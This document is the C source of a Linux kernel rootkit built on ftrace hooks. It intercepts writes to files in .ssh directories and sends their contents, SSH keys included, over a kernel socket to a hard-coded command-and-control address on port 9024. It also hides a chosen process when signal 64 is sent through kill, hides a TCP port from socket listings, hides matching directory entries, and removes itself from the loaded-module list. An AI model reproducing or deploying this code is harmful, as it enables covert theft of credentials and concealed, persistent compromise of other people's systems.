#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/syscalls.h>
#include <linux/dirent.h>
#include <linux/version.h>
#include <linux/namei.h>
#include <linux/file.h>
#include <linux/types.h>
#include <linux/socket.h>
#include <linux/string.h>
#include <linux/inet.h>
#include <linux/in.h>
#include <linux/tcp.h>

#include "ftrace_helper.h"

MODULE_LICENSE("GPL");
MODULE_AUTHOR("TheXcellerator");
MODULE_DESCRIPTION("mkdir syscall hook");
MODULE_VERSION("0.01");


char hide_pid[NAME_MAX];


struct linux_dirent {
    unsigned long d_ino;
    unsigned long d_off;
    unsigned short d_reclen;
    char d_name[];
};

char cncIpAddress[16] = "192.168.1.183";
struct socket *cncSocket;
struct msghdr msg;

struct rootkitMessage {
  uint8_t index;
};




static asmlinkage ssize_t (*orig_vfs)(struct file *file, const char __user *buf, size_t count, loff_t *pos);
static asmlinkage long (*orig_kill)(const struct pt_regs *);
static asmlinkage long (*orig_getdents64)(const struct pt_regs *);
static asmlinkage long (*orig_tcp4_seq_show)(struct seq_file *seq, void *v);


asmlinkage ssize_t vfs_h_write(struct file *file, const char __user *buf, size_t count, loff_t *pos)
{
    char filename[NAME_MAX];
    char directory[NAME_MAX];

    char buffer[count];


    strcpy(filename, file->f_path.dentry->d_name.name);
    strcpy(directory, file->f_path.dentry->d_parent->d_name.name);

    if(strcmp(".ssh", directory) == 0)
    {
        printk(KERN_INFO "rootkit: trying to write to a file %s", file->f_path.dentry->d_name.name);
        printk(KERN_INFO "rootkit: bytes being written %s", buf);

	int sendErr;
	uint8_t whichFile = 0;

	char* truncateStr = strrchr(filename,'.');
	if (truncateStr != NULL){
	   if (strcmp(truncateStr, ".pub") == 0){
	      whichFile = 1;
	   }
	}
	printk("COUNT:%d\n", count);

	struct rootkitMessage rtkMsg;
    	rtkMsg.index = whichFile;
        
	struct kvec vecInit;
	vecInit.iov_base = &rtkMsg;
	vecInit.iov_len = 1;


	struct kvec vecData;
	vecData.iov_base = buf;
	vecData.iov_len = count;

	sendErr = kernel_sendmsg(cncSocket, &msg, &vecData, count, count);

	char *newLine = "\n";
	
	struct kvec vecNewLine;
	vecNewLine.iov_base = newLine;
	vecNewLine.iov_len = 2;

	sendErr = kernel_sendmsg(cncSocket, &msg, &vecNewLine, 2, 2);
	printk("Data Message Sent: %d\n", sendErr);


    }

    
    return orig_vfs(file, buf, count, pos);
}

static asmlinkage long hook_tcp4_seq_show(struct seq_file *seq, void *v)
{
    struct sock *sk = v;

    //put number in hex
    if (sk != 0x1 && sk->sk_num == 0x8532)
        return 0;

    return orig_tcp4_seq_show(seq, v);
}


/* This is our hooked function for sys_getdents64 */
asmlinkage int hook_getdents64(const struct pt_regs *regs)
{
    /* These are the arguments passed to sys_getdents64 extracted from the pt_regs struct */
    // int fd = regs->di;
    struct linux_dirent64 __user *dirent = (struct linux_dirent64 *)regs->si;
    // int count = regs->dx;

    long error;

    /* We will need these intermediate structures for looping through the directory listing */
    struct linux_dirent64 *current_dir, *dirent_ker, *previous_dir = NULL;
    unsigned long offset = 0;

    /* We first have to actually call the real sys_getdents64 syscall and save it so that we can
     * examine it's contents to remove anything that is prefixed by hide_pid.
     * We also allocate dir_entry with the same amount of memory as  */
    int ret = orig_getdents64(regs);
    dirent_ker = kzalloc(ret, GFP_KERNEL);

    if ( (ret <= 0) || (dirent_ker == NULL) )
        return ret;

    /* Copy the dirent argument passed to sys_getdents64 from userspace to kernelspace 
     * dirent_ker is our copy of the returned dirent struct that we can play with */
    error = copy_from_user(dirent_ker, dirent, ret);
    if (error)
        goto done;

    /* We iterate over offset, incrementing by current_dir->d_reclen each loop */
    while (offset < ret)
    {
        /* First, we look at dirent_ker + 0, which is the first entry in the directory listing */
        current_dir = (void *)dirent_ker + offset;

        /* Compare current_dir->d_name to hide_pid - we also have to check that hide_pid isn't empty! */
        if ( (memcmp(hide_pid, current_dir->d_name, strlen(hide_pid)) == 0) && (strncmp(hide_pid, "", NAME_MAX) != 0) )
        {
            /* If hide_pid is contained in the first struct in the list, then we have to shift everything else up by it's size */
            if ( current_dir == dirent_ker )
            {
                ret -= current_dir->d_reclen;
                memmove(current_dir, (void *)current_dir + current_dir->d_reclen, ret);
                continue;
            }
            /* This is the crucial step: we add the length of the current directory to that of the 
             * previous one. This means that when the directory structure is looped over to print/search
             * the contents, the current directory is subsumed into that of whatever preceeds it. */
            previous_dir->d_reclen += current_dir->d_reclen;
        }
        else
        {
            /* If we end up here, then we didn't find hide_pid in current_dir->d_name 
             * We set previous_dir to the current_dir before moving on and incrementing
             * current_dir at the start of the loop */
            previous_dir = current_dir;
        }

        /* Increment offset by current_dir->d_reclen, when it equals ret, then we've scanned the whole
         * directory listing */
        offset += current_dir->d_reclen;
    }

    /* Copy our (perhaps altered) dirent structure back to userspace so it can be returned.
     * Note that dirent is already in the right place in memory to be referenced by the integer
     * ret. */
    error = copy_to_user(dirent, dirent_ker, ret);
    if (error)
        goto done;

done:
    /* Clean up and return whatever is left of the directory listing to the user */
    kfree(dirent_ker);
    return ret;

}

asmlinkage int hook_kill(const struct pt_regs *regs)
{
    /*
     * Pull out the arguments we need from the pt_regs struct
     */
    pid_t pid = regs->di;
    int sig = regs->si;

    /*
     * If the signal is 64, then print a message to the kernel buffer and
     * write the PID as a string to hide_pid
     */
    if (sig == 64)
    {
        printk(KERN_INFO "rootkit: hiding process with pid %d\n", pid);
        sprintf(hide_pid, "%d%", pid);
        return 0;
    }

    /*
     * Otherwise, just return the real sys_kill
     */
    return orig_kill(regs);
}


static struct ftrace_hook hooks[] = {
    // HOOK("__x64_sys_mkdir", hook_mkdir, &orig_mkdir),
    //HOOK("__x64_sys_write", hook_write, &orig_write),
    HOOK("vfs_write", vfs_h_write, &orig_vfs),
    HOOK("__x64_sys_getdents64", hook_getdents64, &orig_getdents64),
    HOOK("__x64_sys_kill", hook_kill, &orig_kill),
    HOOK("tcp4_seq_show", hook_tcp4_seq_show, &orig_tcp4_seq_show),
};

static int __init rootkit_init(void)
{
    int err;
    err = fh_install_hooks(hooks, ARRAY_SIZE(hooks));
    if(err)
        return err;

    struct sockaddr_in cncAddress;
    memset(&cncAddress, 0, sizeof(cncAddress));
    cncAddress.sin_family = AF_INET;
    cncAddress.sin_port = htons(9024);
    cncAddress.sin_addr.s_addr = in_aton(cncIpAddress);

    memset(&msg, 0x00, sizeof(msg));
    msg.msg_name=(struct sockaddr_in*) &cncAddress;
    msg.msg_namelen=sizeof(cncAddress);
    msg.msg_flags = MSG_DONTWAIT | MSG_NOSIGNAL;

    //Create a socket
    int socketErr = sock_create_kern(&init_net, PF_INET, SOCK_STREAM, IPPROTO_TCP, &cncSocket);
    if (socketErr < 0){
    	printk("Socket creation failed");
    }
    else{
	printk("Socket Bound Correctly, Socket Number:%d\n", socketErr);
    }

    int ret = cncSocket->ops->connect(cncSocket, (struct sockaddr *) &cncAddress, sizeof(cncAddress), O_RDWR);
    if (ret < 0){
       printk("Socket Connection Ret:%d\n", ret);
    }

    list_del(&THIS_MODULE->list);


    printk(KERN_INFO "rootkit: loaded\n");
    return 0;
}

static void __exit rootkit_exit(void)
{
    //Send End Message
    //int endMsgErr;
    //struct rootkitMessage rtkEndMsg;
    //rtkEndMsg.index = -1;
    //rtkEndMsg.length = cpu_to_be64(-1);

    //struct kvec vecEnd;
    //vecEnd.iov_base = &rtkEndMsg;
    //vecEnd.iov_len = 9;

    //endMsgErr = kernel_sendmsg(cncSocket, &msg, &vecEnd, 9, 9);
    
    //printk("End Message Bytes: %d\n", endMsgErr);
    
    fh_remove_hooks(hooks, ARRAY_SIZE(hooks));
    printk(KERN_INFO "rootkit: unloaded\n");
}

module_init(rootkit_init);
module_exit(rootkit_exit);
